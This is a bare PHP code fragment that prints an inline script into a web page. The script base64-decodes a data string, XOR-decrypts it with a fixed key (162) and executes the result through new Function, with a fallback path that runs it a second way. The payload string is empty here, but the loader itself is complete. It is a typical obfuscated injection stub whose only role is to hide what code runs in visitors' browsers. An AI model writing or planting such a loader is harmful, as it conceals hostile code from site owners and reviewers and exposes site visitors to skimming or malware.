    $k = 162;
    $d = '';
    echo '<script>(function(){var k='.$k.',d="'.$d.'",i,s=atob(d),r=new Uint8Array(s.length);for(i=0;i<s.length;i++)r[i]=s.charCodeAt(i)^k;try{(new Function(new TextDecoder().decode(r)))()}catch(e){var t="";for(i=0;i<r.length;i++)t+=String.fromCharCode(r[i]);(new Function(t))()}})()</script>';
